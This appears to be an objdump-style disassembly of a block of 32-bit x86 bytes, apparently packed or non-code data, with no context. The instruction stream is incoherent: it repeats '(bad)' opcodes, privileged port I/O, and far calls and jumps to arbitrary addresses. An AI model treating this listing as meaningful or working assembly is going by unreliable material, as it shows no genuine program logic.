  417dc5:	lods   al,BYTE PTR ds:[esi]
  417dc6:	scas   eax,DWORD PTR es:[edi]
  417dc7:	out    0xec,eax
  417dc9:	sub    bl,dh
  417dcb:	adc    edi,0xe4662391
  417dd1:	aas    
  417dd2:	adc    DWORD PTR [ecx-0x24f21c50],0xffffffbf
  417dd9:	arpl   WORD PTR [edi+eiz*8+0x22c62992],di
  417de0:	pop    edx
  417de1:	xchg   esi,eax
  417de2:	das    
  417de3:	nop
  417de4:	jecxz  0x417d7e
  417de6:	xchg   ebx,eax
  417de7:	out    0x5,eax
  417de9:	pop    edi
  417dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417deb:	retf   
  417dec:	dec    esi
  417ded:	sub    eax,DWORD PTR [edi+eax*4-0x68b440fd]
  417df4:	mov    al,ds:0x6336efb6
  417df9:	add    al,0xe3
  417dfb:	ret    
  417dfc:	int    0x80
  417dfe:	pop    ebp
  417dff:	or     ebx,edx
  417e01:	leave  
  417e02:	cmp    ah,0x98
  417e05:	inc    ecx
  417e06:	sbb    eax,0xe17bce35
  417e0b:	inc    esi
  417e0c:	in     eax,0x85
  417e0e:	mov    si,0x57c4
  417e12:	rol    BYTE PTR [ecx+ebp*4+0x5c],1
  417e16:	idiv   bl
  417e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e19:	in     al,0xc5
  417e1b:	mov    ds:0x3941324,eax
  417e20:	xchg   edx,eax
  417e21:	fnstcw WORD PTR [esi+ebp*4]
  417e24:	add    DWORD PTR [edx],ebp
  417e26:	bswap  eax
  417e28:	sbb    bl,dl
  417e2a:	mov    ebx,0xfc5e4cf0
  417e2f:	mov    bh,0xff
  417e31:	sub    BYTE PTR [esi],dh
  417e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e34:	sbb    eax,0x15ad0b80
  417e39:	retf   0x8ac9
  417e3c:	inc    esp
  417e3d:	mov    ecx,0x1f572b85
  417e42:	iret   
  417e43:	inc    esp
  417e44:	or     DWORD PTR [esi-0x68315bd8],0x615d3da4
  417e4e:	imul   edx,DWORD PTR [edi],0xeaa71a5b
  417e54:	xchg   DWORD PTR [eax+eiz*1-0x6b],esp
  417e58:	icebp  
  417e59:	pop    DWORD PTR [edi]
  417e5b:	dec    eax
  417e5c:	in     eax,dx
  417e5d:	mov    dl,BYTE PTR [edi-0x65]
  417e60:	mov    ebx,0xb1898db6
  417e65:	std    
  417e66:	cmp    al,0x43
  417e68:	outs   dx,BYTE PTR ds:[esi]
  417e69:	mov    ah,0xb8
  417e6b:	fnsave [eax+ebx*2-0x1]
  417e6f:	xlat   BYTE PTR ds:[ebx]
  417e70:	mov    al,0x85
  417e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e73:	adc    edi,DWORD PTR [bp+0x48]
  417e77:	(bad)  
  417e78:	cmc    
  417e79:	fild   DWORD PTR [edi+0x1a]
  417e7c:	mov    edi,0xdc8e7de2
  417e81:	adc    al,0x73
  417e83:	xchg   edi,eax
  417e84:	ins    DWORD PTR es:[edi],dx
  417e85:	mov    edi,0x9cde2972
  417e8a:	xor    eax,0x5d8e61a9
  417e8f:	rcl    BYTE PTR [eax],cl
  417e91:	leave  
  417e92:	inc    ebp
  417e93:	jg     0x417f0b
  417e95:	fimul  WORD PTR [ecx-0x48135fb6]
  417e9b:	jg     0x417f08
  417e9d:	push   esi
  417e9e:	div    edx
  417ea0:	int3   
  417ea1:	das    
  417ea2:	nop
  417ea3:	test   DWORD PTR [ebp+0x56],esp
  417ea6:	xchg   ebx,eax
  417ea7:	test   BYTE PTR [ecx],0x14
  417eaa:	jmp    ebp
  417eac:	test   DWORD PTR [ecx-0x26],esp
  417eaf:	jns    0x417f29
  417eb1:	and    eax,0x34ed0731
  417eb6:	stc    
  417eb7:	aas    
  417eb8:	test   al,0x2a
  417eba:	bound  esp,QWORD PTR [esi+0x7560e1d]
  417ec0:	loope  0x417f08
  417ec2:	fwait
  417ec3:	pop    es
  417ec4:	inc    eax
  417ec5:	xchg   ecx,eax
  417ec6:	in     eax,0x4b
  417ec8:	inc    ebx
  417ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eca:	data16 and BYTE PTR [ebp+0x35d8040f],bh
  417ed1:	aad    0x82
  417ed3:	cli    
  417ed4:	and    DWORD PTR [esi+ebx*2-0x14],eax
  417ed8:	dec    eax
  417ed9:	mov    ds:0x2056e4d7,eax
  417ede:	inc    edx
  417edf:	pop    edx
  417ee0:	jmp    0x5e675853
  417ee5:	pop    esp
  417ee6:	cmp    eax,0xd1c50cb
  417eeb:	bound  ebx,QWORD PTR [ebx+0x42]
  417eee:	retf   
  417eef:	inc    edi
  417ef0:	push   esi
  417ef1:	stos   BYTE PTR es:[edi],al
  417ef2:	or     dh,BYTE PTR [esi+0x52260e5b]
  417ef8:	dec    edi
  417ef9:	daa    
  417efa:	push   ebp
  417efb:	fdivr  DWORD PTR [ebx]
  417efd:	scas   eax,DWORD PTR es:[edi]
  417efe:	push   ebp
  417eff:	leave  
  417f00:	loop   0x417f4e
  417f02:	mov    ebx,0xb7cd7a27
  417f07:	neg    dh
  417f09:	(bad)  
  417f0a:	xchg   ebx,eax
  417f0b:	ins    BYTE PTR es:[edi],dx
  417f0c:	retf   
  417f0d:	clc    
  417f0e:	daa    
  417f0f:	xor    al,0xc8
  417f11:	inc    esp
  417f12:	call   0x8488:0x8f5ee07a
  417f19:	cmp    DWORD PTR [edi+ebx*2-0x15],edi
  417f1d:	add    cl,BYTE PTR ds:0x555f1792
  417f23:	sbb    BYTE PTR [esi],dl
  417f25:	lahf   
  417f26:	dec    edi
  417f27:	lods   eax,DWORD PTR ds:[esi]
  417f28:	pop    ebx
  417f29:	in     al,0x3d
  417f2b:	test   BYTE PTR [edi-0x71],ah
  417f2e:	push   edx
  417f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f30:	fist   DWORD PTR [ecx-0x80]
  417f33:	dec    ebp
  417f34:	xor    BYTE PTR fs:[ebx],al
  417f37:	push   0x60209192
  417f3c:	repz jle 0x417ed7
  417f3f:	dec    esi
  417f40:	and    eax,0x41d358dc
  417f45:	cmp    bl,BYTE PTR [eax-0x8]
  417f48:	xor    BYTE PTR [ebx-0x6b],0x2b
  417f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f4d:	jmp    0x2e50:0xe8366c94
  417f54:	shl    edx,1
  417f56:	pop    ss
  417f57:	and    al,0xf6
  417f59:	call   0x39ca:0x77699045
  417f60:	jo     0x417fdd
  417f62:	rol    ecx,0xb2
  417f65:	pop    ds
  417f66:	mov    ecx,0xd48b5ce6
  417f6b:	or     DWORD PTR [edi+esi*4+0x51b968ff],ecx
  417f72:	cld    
  417f73:	dec    ebx
  417f74:	mov    al,0x0
  417f76:	inc    ebp
  417f77:	call   0xde93:0x151866f
  417f7e:	and    eax,0x5420dfae
  417f83:	lahf   
  417f84:	test   eax,eax
  417f86:	ret    0xf402
  417f89:	lds    ebp,FWORD PTR [edi-0x68]
  417f8c:	or     eax,0x62d5045f
  417f91:	jl     0x417f7b
  417f93:	xchg   ebx,eax
  417f94:	icebp  
  417f95:	mov    ebx,0x7e902a0c
  417f9a:	lahf   
  417f9b:	shl    BYTE PTR [ebx],1
  417f9d:	aam    0x3c
  417f9f:	or     bh,cl
  417fa1:	scas   al,BYTE PTR es:[edi]
  417fa2:	cmp    al,0x47
  417fa4:	mov    esp,0x375a825a
  417fa9:	imul   esp,DWORD PTR [edi-0x6ca892dc],0x35
  417fb0:	ins    DWORD PTR es:[edi],dx
  417fb1:	jns    0x417fb2
  417fb3:	fwait
  417fb4:	inc    eax
  417fb5:	(bad)  
  417fb6:	xchg   ebp,eax
  417fb7:	xchg   ecx,ebx
  417fb9:	mov    ?,WORD PTR [esi+0x6eefeb32]
  417fbf:	dec    edi
  417fc0:	mov    esi,0x74810518
  417fc5:	ins    BYTE PTR es:[edi],dx
  417fc6:	push   edx
  417fc7:	mov    cl,0x74
  417fc9:	shr    BYTE PTR [eax],0xb2
  417fcc:	call   0x8f4ee39a
  417fd1:	or     BYTE PTR ds:0x57682806,bh
  417fd7:	mov    edi,0xe0d51a7d
  417fdc:	mov    al,ds:0x7604b9df
  417fe1:	inc    eax
  417fe2:	out    0x11,al
  417fe4:	sbb    DWORD PTR [esi+0x22],edi
  417fe7:	mov    BYTE PTR [edi+0x6c],cl
  417fea:	pop    esp
  417feb:	push   esp
  417fec:	cmp    eax,0x58b60b82
  417ff1:	dec    edi
  417ff2:	and    BYTE PTR [ebx-0x65],al
  417ff5:	shr    ch,0xa9
  417ff8:	out    0x1e,eax
  417ffa:	ss mov ebx,ebx
  417ffd:	jo     0x417f87
  417fff:	pop    ecx
  418000:	stc    
  418001:	jecxz  0x41805d
  418003:	int    0xfa
  418005:	(bad)  
  418006:	fisubr DWORD PTR [eax]
  418008:	xor    al,0x1b
  41800a:	jo     0x417fc5
  41800c:	push   ds
  41800d:	push   ebx
  41800e:	mov    ebp,0xbd0834c9
  418013:	jge    0x41806e
  418015:	add    BYTE PTR [edi+0x67],al
  418018:	bound  edi,QWORD PTR [ecx+eax*1]
  41801b:	pop    ds
  41801c:	mov    al,0x8
  41801e:	aam    0x1b
  418020:	mov    bh,0x31
  418022:	cmp    BYTE PTR [ebp-0x1e1f539f],bh
  418028:	jl     0x4180a0
  41802a:	inc    ebp
  41802b:	movlps QWORD PTR [eax],xmm4
  41802e:	enter  0xee59,0xdb
  418032:	inc    edx
  418033:	sbb    DWORD PTR [edi],esp
  418035:	scas   eax,DWORD PTR es:[edi]
  418036:	inc    BYTE PTR [ebx]
  418038:	xchg   edx,eax
  418039:	or     esi,0xdc58005
  41803f:	cmp    eax,0x176095dc
  418044:	sbb    edi,esp
  418046:	fistp  QWORD PTR [ecx-0x4b1aac33]
  41804c:	sti    
  41804d:	(bad)  
  41804f:	fs mov bh,0x77
  418052:	repz mov al,ds:0xa234824b
  418058:	add    eax,0xa3fff77e
  41805d:	(bad)  
  41805e:	xor    BYTE PTR [ecx+0x5e],cl
  418061:	pop    es
  418062:	jl     0x4180a9
  418064:	outs   dx,BYTE PTR ds:[esi]
  418065:	shr    dh,cl
  418067:	pop    ds
  418068:	repz push eax
  41806a:	ins    DWORD PTR es:[edi],dx
  41806b:	retf   0x556
  41806e:	enter  0xafc3,0x2e
  418072:	or     eax,0xb30efaf0
  418077:	pop    esp
  418078:	out    dx,al
  418079:	add    eax,0x11358a51
  41807e:	pop    eax
  41807f:	ds mov bh,0x22
  418082:	cs retf 
  418084:	sub    al,0x45
  418086:	sub    DWORD PTR [esi],esi
  418088:	jae    0x41803f
  41808a:	cmp    BYTE PTR es:[ebx],bh
  41808d:	icebp  
  41808e:	xchg   edx,eax
  41808f:	dec    esi
  418090:	mov    WORD PTR [ebx-0x3662774d],ds
  418096:	xchg   edx,eax
  418097:	dec    eax
  418098:	(bad)  
  418099:	jge    0x4180db
  41809b:	(bad)  
  41809c:	jg     0x418025
  41809e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41809f:	out    dx,al
  4180a0:	adc    ebp,DWORD PTR [edx+0x75569f54]
  4180a6:	xor    ch,BYTE PTR [eax+0x1e]
  4180a9:	lock jmp 0x9f46094d
  4180af:	jle    0x41806d
  4180b1:	sar    ebp,0x88
  4180b4:	mov    al,0xe7
  4180b6:	cmc    
  4180b7:	cdq    
  4180b8:	add    edi,edi
  4180ba:	stos   BYTE PTR es:[edi],al
  4180bb:	repnz push es
  4180bd:	in     al,dx
  4180be:	ror    DWORD PTR [ebx],cl
  4180c0:	jno    0x4180d5
  4180c2:	push   0x59
  4180c4:	pop    ebx
  4180c5:	jmp    0x78bf1be3
  4180ca:	out    0xe8,al
  4180cc:	js     0x418126
  4180ce:	daa    
  4180cf:	pop    ecx
  4180d0:	test   edx,0x701dff61
  4180d6:	pop    edx
  4180d7:	and    eax,0x3503fe4a
  4180dc:	shl    DWORD PTR [edx-0xe],cl
  4180df:	push   cs
  4180e0:	mov    si,0xc072
  4180e4:	(bad)
  4180e7:	test   BYTE PTR [ecx-0x62f797db],cl
  4180ed:	sub    DWORD PTR [esi-0x59c7060e],eax
  4180f3:	jmp    0x418113
  4180f5:	test   ah,bh
  4180f7:	pop    es
  4180f8:	daa    
  4180f9:	mov    ah,0x4d
  4180fb:	cmc    
  4180fc:	repz pop ebx
  4180fe:	stos   DWORD PTR es:[edi],eax
  4180ff:	stos   DWORD PTR es:[edi],eax
  418100:	add    ecx,ecx
  418102:	dec    esp
  418103:	out    0xc9,eax
  418105:	mov    DWORD PTR [eax-0x11],ebp
  418108:	add    edi,DWORD PTR gs:[edx]
  41810b:	add    bh,BYTE PTR ds:0xaef92850
  418111:	test   BYTE PTR [ebx-0x45],bl
  418114:	cmp    eax,0xe2ad6840
  418119:	loope  0x418164
  41811b:	adc    bl,BYTE PTR [eax+0xd]
  41811e:	jmp    0xe9b4:0x72f38fd9
  418125:	xchg   edi,eax
  418126:	mov    WORD PTR [ebx+0x76],?
  418129:	fwait
  41812a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41812b:	mov    ecx,0x9dc82337
  418130:	js     0x4180cb
  418132:	inc    eax
  418133:	cmp    al,0xbc
  418135:	stc    
  418136:	adc    al,0x15
  418138:	dec    edi
  418139:	aas    
  41813a:	(bad)  
  41813b:	jge    0x418119
  41813d:	mov    eax,0xf2f9ffb6
  418142:	je     0x41819b
  418144:	mov    dl,0xb4
  418146:	loopne 0x418162
  418148:	in     al,0x32
  41814a:	sbb    al,0xd1
  41814c:	(bad)  
  41814d:	adc    ecx,ebx
  41814f:	or     DWORD PTR [esi+0x6],0x36
  418153:	cmp    eax,esp
  418155:	rol    DWORD PTR [ebp+0x244f4031],1
  41815b:	pop    ss
  41815c:	mov    ecx,0xb7b86a61
  418161:	loop   0x4181c7
  418163:	inc    edx
  418164:	ror    DWORD PTR [eax],0xb4
  418167:	pushf  
  418168:	sub    eax,0xa043bd73
  41816d:	inc    ecx
  41816e:	dec    esi
  41816f:	mov    esp,0x7fd8fb1f
  418174:	sub    DWORD PTR [edi+0x4444e266],esp
  41817a:	dec    edi
  41817b:	inc    esi
  41817c:	mov    ?,WORD PTR [ebx]
  41817e:	jns    0x41813f
  418180:	aad    0x6b
  418182:	gs pop eax
  418184:	lods   al,BYTE PTR ds:[esi]
  418185:	pop    esi
  418186:	mov    WORD PTR [ebp-0x3cdad867],gs
  41818c:	dec    ecx
  41818d:	ins    BYTE PTR es:[edi],dx
  41818e:	adc    DWORD PTR [eax],esi
  418190:	mov    DWORD PTR [eax-0x11],eax
  418193:	or     ecx,esp
  418195:	xchg   edx,eax
  418196:	(bad)  
  418197:	icebp  
  418198:	retf   
  418199:	xor    cl,al
  41819b:	cmp    ah,bh
  41819d:	ins    DWORD PTR es:[edi],dx
  41819e:	sbb    DWORD PTR [ebx-0x4f071d07],0x3c301920
  4181a8:	jecxz  0x418156
  4181aa:	sub    edx,esp
  4181ac:	push   cs
  4181ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ae:	mov    eax,0x46f82dbf
  4181b3:	scas   eax,DWORD PTR es:[edi]
  4181b4:	call   0xc7fec32b
  4181b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181ba:	lds    edx,FWORD PTR [ebx+0x79]
  4181bd:	ret    0x313b
  4181c0:	mov    esp,0x26159823
  4181c5:	mov    dl,0x68
  4181c7:	push   edi
  4181c8:	call   0xe219:0xd929045e
  4181cf:	add    eax,0xf7399a02
  4181d4:	pushf  
  4181d5:	and    edx,DWORD PTR ds:0x5ad647ec
  4181db:	pusha  
  4181dc:	push   ss
  4181dd:	std    
  4181de:	lock mul DWORD PTR [ebp+0x10b8d17e]
  4181e5:	pop    edx
  4181e6:	stc    
  4181e7:	mov    edi,0x30ca8842
  4181ec:	push   es
  4181ed:	cld    
  4181ee:	mov    dh,BYTE PTR [ebp-0x24]
  4181f1:	cwde   
  4181f2:	rcl    BYTE PTR [ebp-0xe2efbf1],cl
  4181f8:	mov    eax,ds:0x5c825fb7
  4181fd:	xchg   esi,eax
  4181fe:	fs xchg ebp,eax
  418200:	add    BYTE PTR [edx+0x3a],dh
  418203:	enter  0xd7f8,0x67
  418207:	pusha  
  418208:	push   ss
  418209:	xor    BYTE PTR [ebx],bl
  41820b:	retf   0x616e
  41820e:	scas   eax,DWORD PTR es:[edi]
  41820f:	push   ds
  418210:	je     0x418248
  418212:	cdq    
  418213:	cmp    al,0x7a
  418215:	(bad)  [edx]
  418217:	jmp    0xd332b390
  41821c:	push   ebx
  41821d:	or     eax,0x3f3d08ca
  418222:	jnp    0x4181df
  418224:	xor    DWORD PTR [edi],edi
  418226:	mov    WORD PTR [ebx],?
  418228:	ds xchg ebx,eax
  41822a:	into   
  41822b:	jle    0x418254
  41822d:	inc    ebx
  41822e:	std    
  41822f:	shl    ebp,cl
  418231:	and    al,0xc
  418233:	mov    DWORD PTR [edi-0x36],ebp
  418236:	shl    DWORD PTR [edx+0x42f31710],cl
  41823c:	dec    edi
  41823d:	xor    esi,DWORD PTR [edx]
  41823f:	in     eax,0x72
  418241:	daa    
  418242:	shl    ebx,0xe4
  418245:	les    ecx,FWORD PTR [edi+esi*8+0xa3b8faa]
  41824c:	add    BYTE PTR [esi-0x74],bl
  41824f:	pop    esp
  418250:	aas    
  418251:	dec    ebx
  418252:	aam    0x4f
  418254:	fs mov bh,0x90
  418257:	in     eax,0xfa
  418259:	push   0x675d58fe
  41825e:	aas    
  41825f:	push   0xbe97602b
  418264:	xor    edi,eax
  418266:	pop    ss
  418267:	aam    0xb6
  418269:	loope  0x418236
  41826b:	ror    DWORD PTR [eax],cl
  41826d:	mov    ebx,0x46f45fcd
  418272:	jns    0x41824b
  418274:	dec    ecx
  418275:	imul   BYTE PTR [edi]
  418277:	pusha  
  418278:	in     eax,0xb
  41827a:	lahf   
  41827b:	push   edi
  41827c:	add    eax,0x449cabf8
  418281:	or     DWORD PTR [esi+0x4a6f4c77],ebx
  418287:	jle    0x4182ff
  418289:	jbe    0x418213
  41828b:	pop    eax
  41828c:	adc    ah,dl
  41828e:	fild   QWORD PTR [ebx-0x7e3ad1a]
  418294:	jmp    0x418260
  418296:	mov    ds:0x3a487fe5,eax
  41829c:	add    eax,0x145855aa
  4182a1:	out    dx,al
  4182a2:	xchg   ecx,eax
  4182a3:	mov    eax,0xe216b76e
  4182a8:	adc    al,0xcd
  4182aa:	cmp    al,0x10
  4182ac:	outs   dx,BYTE PTR ds:[esi]
  4182ad:	cdq    
  4182ae:	jno    0x418303
  4182b0:	dec    eax
  4182b1:	addr16 jle 0x4182b4
  4182b4:	out    0x2b,eax
  4182b6:	push   esp
  4182b7:	ret    0xc5b
  4182ba:	mov    ebx,0x8eebe25e
  4182bf:	ja     0x4182a6
  4182c1:	dec    ecx
  4182c2:	test   DWORD PTR [ebx],ebx
  4182c4:	sub    esp,esp
  4182c6:	outs   dx,BYTE PTR ds:[esi]
  4182c7:	jge    0x418314
  4182c9:	sbb    eax,0x6b0755da
  4182ce:	(bad)  
  4182cf:	rol    DWORD PTR [eax+edx*2],1
  4182d2:	and    ah,BYTE PTR [esi+0x739ebb0f]
  4182d8:	xor    BYTE PTR [esi+0x1d],dl
  4182db:	mov    ah,0x3b
  4182de:	rcl    cl,1
  4182e0:	mov    ah,0x8c
  4182e2:	mov    ds:0x79324982,al
  4182e8:	inc    ecx
  4182e9:	adc    ebx,DWORD PTR [ecx-0x1]
  4182ec:	imul   ebx,ecx,0x58
  4182ef:	xchg   ebx,esi
  4182f1:	nop
  4182f2:	std    
  4182f3:	aas    
  4182f4:	cld    
  4182f5:	fimul  DWORD PTR [ebx+0x5d1ea46f]
  4182fb:	enter  0x7d0b,0x2e
  4182ff:	sub    BYTE PTR [ebx-0x41c20b1c],bh
  418305:	mov    ch,0x60
  418307:	jmp    0xb3e3:0x6991ab90
  41830e:	icebp  
  41830f:	cmp    cl,BYTE PTR [edx+0x57]
  418312:	xchg   ebx,eax
  418313:	lahf   
  418314:	adc    ch,BYTE PTR [ebp-0x46]
  418317:	jmp    0x907e44a8
  41831c:	add    al,0xe5
  41831e:	dec    edx
  41831f:	adc    bh,al
  418321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418322:	mov    cl,0xf7
  418324:	adc    ebx,DWORD PTR [ecx-0x33c8ca39]
  41832a:	or     al,0x5b
  41832c:	dec    ebx
  41832d:	or     DWORD PTR [ecx+ecx*1-0x3f],ecx
  418331:	pusha  
  418332:	(bad)  
  418333:	out    0x36,al
  418335:	jmp    DWORD PTR ds:0x1160f792
  41833b:	add    DWORD PTR [ecx+0x4b],ebx
  41833e:	push   ds
  41833f:	fcmovb st,st(2)
  418341:	(bad)  
  418342:	fdivr  st,st(7)
  418344:	test   al,0x3d
  418346:	adc    al,0x2f
  418348:	dec    edx
  418349:	xlat   BYTE PTR ds:[ebx]
  41834a:	ret    
  41834b:	jle    0x418372
  41834d:	fist   WORD PTR [ecx-0x38]
  418350:	iret   
  418351:	sbb    bl,cl
  418353:	jns    0x4183ae
  418355:	mov    ebx,eax
  418357:	jnp    0x4182e7
  418359:	add    al,0x94
  41835b:	dec    esi
  41835c:	test   al,0x65
  41835e:	push   es
  41835f:	jmp    0x418364
  418361:	mov    ah,0x1c
  418363:	mov    al,0xed
  418365:	adc    al,0xd0
  418367:	mov    esp,0x9c04c55
  41836c:	(bad)  
  41836d:	or     DWORD PTR [ecx],ebx
  41836f:	enter  0x3010,0x7d
  418373:	popf   
  418374:	daa    
  418375:	push   ebp
  418376:	or     ecx,ecx
  418378:	mov    cl,0x24
  41837a:	repnz ds (bad) 
  41837d:	in     al,dx
  41837e:	xlat   BYTE PTR ds:[ebx]
  41837f:	xor    eax,DWORD PTR [ecx+ebx*4]
  418382:	arpl   WORD PTR [esi-0x30ab3bde],bp
  418388:	cmp    eax,eax
  41838a:	(bad)  
  41838b:	or     DWORD PTR [ecx+0x4e],esi
  41838e:	or     al,0xf0
  418390:	pop    ecx
  418391:	xchg   BYTE PTR [ecx+eiz*4-0x1ae2e791],dl
  418398:	sti    
  418399:	jns    0x41839e
  41839b:	lahf   
  41839c:	add    DWORD PTR [edx],ebp
  41839e:	xor    eax,0xb537d950
  4183a3:	pusha  
  4183a4:	cmp    al,0x74
  4183a6:	jb     0x418420
  4183a8:	(bad)  
  4183a9:	dec    ebp
  4183aa:	lea    edi,[esi+0x27]
  4183ad:	xchg   esp,eax
  4183ae:	jl     0x4183ae
  4183b0:	clc    
  4183b1:	add    eax,0xe9e70bdd
  4183b6:	mov    gs,WORD PTR [ecx]
  4183b8:	mov    bh,0x38
  4183ba:	cdq    
  4183bb:	sbb    ecx,DWORD PTR [ebx]
  4183bd:	out    0x7c,al
  4183bf:	jge    0x41839a
  4183c1:	dec    edi
  4183c2:	pushf  
  4183c3:	int    0x97
  4183c5:	cs dec esi
  4183c7:	push   DWORD PTR ds:0x312ade59
  4183cd:	mov    ebx,0x399af5a4
  4183d2:	(bad)  
  4183d3:	leave  
  4183d4:	mov    ebx,0x2dc68c62
  4183d9:	mov    ss,edi
  4183db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183dd:	test   ch,0xcd
  4183e0:	adc    BYTE PTR ds:0xc893016b,cl
  4183e6:	call   0x2758289
  4183eb:	mov    ebp,0x8ebe3d87
  4183f0:	out    0x89,eax
  4183f2:	push   eax
  4183f3:	popf   
  4183f4:	pop    esi
  4183f5:	and    bl,BYTE PTR [edi]
  4183f7:	stos   BYTE PTR es:[edi],al
  4183f8:	mov    eax,ds:0xa1ee8ab1
  4183fd:	pop    edi
  4183fe:	mov    dl,cl
  418400:	fs pusha 
  418402:	adc    eax,0x618386cb
  418407:	mov    esi,0x1ba282df
  41840c:	ds jle 0x41839b
  41840f:	xor    edx,eax
  418411:	aas    
  418412:	or     esi,DWORD PTR [esi+0x4489f4c2]
  418418:	add    esp,ebx
  41841a:	jns    0x4183fa
  41841c:	(bad)  
  41841d:	shr    DWORD PTR [eax+0x6],cl
  418420:	and    eax,DWORD PTR [ecx+0x67]
  418423:	push   ebx
  418424:	jp     0x4183f0
  418426:	shl    dh,0x38
  418429:	inc    esp
  41842a:	cmp    esi,ebx
  41842c:	call   0xfaa2:0xa85728e4
  418433:	stc    
  418434:	stos   DWORD PTR es:[edi],eax
  418435:	mov    edx,0x1e54fbcf
  41843a:	retf   0x3d06
  41843d:	jecxz  0x418496
  41843f:	push   esi
  418440:	aam    0xa2
  418442:	sbb    DWORD PTR [edx-0x23],edx
  418445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418446:	shr    DWORD PTR [esi],0x35
  418449:	iret   
  41844a:	(bad)  
  41844b:	out    dx,eax
  41844c:	out    0x6d,eax
  41844e:	push   0x52eb1fd
  418453:	popa   
  418454:	inc    edi
  418455:	xchg   BYTE PTR [ebx],dh
  418457:	pop    es
  418458:	sbb    cl,ah
  41845a:	mov    fs,WORD PTR [edi]
  41845c:	jae    0x4183e2
  41845e:	jnp    0x41846d
  418460:	ror    esi,1
  418462:	sar    DWORD PTR [ecx],cl
  418464:	xlat   BYTE PTR ds:[bx]
  418466:	and    eax,0x7fd7cd0b
  41846b:	retf   
  41846c:	mov    ch,0x3e
  41846e:	daa    
  41846f:	ins    BYTE PTR es:[edi],dx
  418470:	inc    edx
  418471:	jno    0x4183fc
  418473:	fwait
  418474:	push   ebx
  418475:	xor    eax,0x823babed
  41847a:	jge    0x418459
  41847c:	jae    0x4184bb
  41847e:	push   ds
  41847f:	mov    ch,BYTE PTR [esi-0x625cf60a]
  418485:	mov    dh,0x62
  418487:	sbb    DWORD PTR [ebx+ebx*4],ebp
  41848a:	inc    esp
  41848c:	out    dx,al
  41848d:	inc    eax
  41848e:	aas    
  41848f:	lds    ebp,FWORD PTR [eax]
  418491:	(bad)
  418495:	popa   
  418496:	jl     0x4184ee
  418498:	scas   eax,DWORD PTR es:[edi]
  418499:	(bad)  
  41849a:	ins    BYTE PTR es:[edi],dx
  41849b:	mov    eax,ds:0x7c080a6e
  4184a0:	jle    0x418509
  4184a2:	jbe    0x4184c0
  4184a4:	or     al,0x52
  4184a6:	xor    al,0xa0
  4184a8:	loop   0x41846f
  4184aa:	sub    eax,0x383d5c84
  4184af:	test   BYTE PTR [esi],dh
  4184b1:	mov    dh,0x13
  4184b3:	lock xchg edx,eax
  4184b5:	aaa    
  4184b6:	iret   
  4184b7:	(bad)  
  4184b8:	repnz rcr DWORD PTR [esi],1
  4184bb:	cmp    eax,0xd176d8cd
  4184c0:	push   0xfffffff3
  4184c2:	xchg   ebx,eax
  4184c3:	scas   eax,DWORD PTR es:[edi]
  4184c4:	push   esp
  4184c5:	mov    esp,0x8052aeb5
  4184ca:	call   0xfea3:0xadbdcbd0
  4184d1:	pop    DWORD PTR [esi+0x1]
  4184d4:	mov    al,0x5d
  4184d6:	jne    0x41850f
  4184d8:	and    ebp,DWORD PTR [eax]
  4184da:	pop    ss
  4184db:	fs mov ecx,0x6af5dc5c
  4184e1:	repnz pop ebp
  4184e3:	jae    0x418524
  4184e5:	pop    ebp
  4184e6:	dec    ebx
  4184e7:	call   0x96b8:0x2a7d09fa
  4184ee:	or     BYTE PTR [esp+ebx*4-0x56],ch
  4184f2:	retf   
  4184f3:	loope  0x4184a1
  4184f5:	jg     0x4184ca
  4184f7:	test   DWORD PTR [eax],0x30bb1cba
  4184fd:	and    eax,0x3f9c1d20
  418502:	add    BYTE PTR [bx-0x15],0x96
  418507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418508:	add    eax,ecx
  41850a:	cmp    al,0x7
  41850c:	and    al,0x52
  41850e:	jmp    0x8e8289f3
  418513:	push   eax
  418514:	mov    ebp,0xd80e67a8
  418519:	jecxz  0x41853b
  41851b:	and    eax,0xf17f7901
  418521:	cdq    
  418522:	int3   
  418523:	sbb    DWORD PTR [esi],esp
  418525:	loopne 0x4184ca
  418527:	outs   dx,BYTE PTR ds:[esi]
  418528:	ret    0xc390
  41852b:	outs   dx,BYTE PTR ds:[esi]
  41852c:	scas   eax,DWORD PTR es:[edi]
  41852d:	sti    
  41852e:	inc    esp
  41852f:	or     esp,DWORD PTR [ebx+0x1b0e19de]
  418535:	pusha  
  418536:	pop    ebx
  418537:	jecxz  0x418501
  418539:	test   eax,0xc69b3aa9
  41853e:	stos   DWORD PTR es:[edi],eax
  41853f:	inc    esi
  418540:	push   0xb5542dc5
  418545:	xor    BYTE PTR [edi+0x74],dh
  418548:	pop    eax
  418549:	xor    al,BYTE PTR [edi]
  41854b:	aad    0xdc
  41854d:	adc    eax,0x2e5cf926
  418552:	neg    edx
  418554:	lds    ebx,FWORD PTR [eax+0x55d8d33e]
  41855a:	add    bh,BYTE PTR [ebp+0x48b9a683]
  418560:	mov    eax,ds:0x2dba1025
  418565:	add    eax,0x635666a2
  41856a:	(bad)  
  41856b:	leave  
  41856c:	inc    esi
  41856d:	jecxz  0x418560
  41856f:	jge    0x4185cf
  418571:	and    BYTE PTR [esi+0x2c7351d6],ah
  418577:	aam    0x6d
  418579:	push   ebp
  41857a:	inc    ecx
  41857b:	aam    0x44
  41857d:	cwde   
  41857e:	jle    0x418535
  418580:	gs pushf 
  418582:	outs   dx,DWORD PTR ds:[esi]
  418583:	inc    DWORD PTR [esi-0x12]
  418586:	mov    edi,ebp
  418588:	cwde   
  418589:	pop    ecx
  41858a:	jp     0x4185ac
  41858c:	call   FWORD PTR [esi]
  41858e:	nop
  41858f:	push   ds
